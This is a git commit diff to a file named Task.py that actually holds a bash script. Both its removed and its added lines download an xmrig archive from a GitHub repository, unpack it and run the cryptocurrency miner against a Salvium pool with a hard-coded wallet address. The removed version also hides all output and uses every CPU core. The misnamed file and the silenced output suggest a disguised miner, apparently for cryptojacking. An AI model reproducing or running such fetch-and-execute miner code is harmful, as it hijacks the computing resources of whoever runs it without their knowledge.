8371e5404b524806f4f252eaa2ae15adaaeeade7
mariana131312 <lalamarina767@tognu.com>
2025-03-02 23:44:37 +0700

    Update Task.py

--- Task.py
+++ Task.py
@@ -1,6 +1,3 @@
 #!/bin/bash
-A=sg.salvium.herominers.com:1230
-B=SaLvsAi6k4C755eL7xEEEZJ4JDVUyx1gn9wtrJGngGkdMLRoTB721euSG2wbT14dn2885qFc93mS3eJQ9bwWQEmk58CgQmrj5nF
-C=garsel
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o sg.salvium.gfwroute.com:1230 -u solo:SaLvsAi6k4C755eL7xEEEZJ4JDVUyx1gn9wtrJGngGkdMLRoTB721euSG2wbT14dn2885qFc93mS3eJQ9bwWQEmk58CgQmrj5nF -p gasken23 -a rx/0
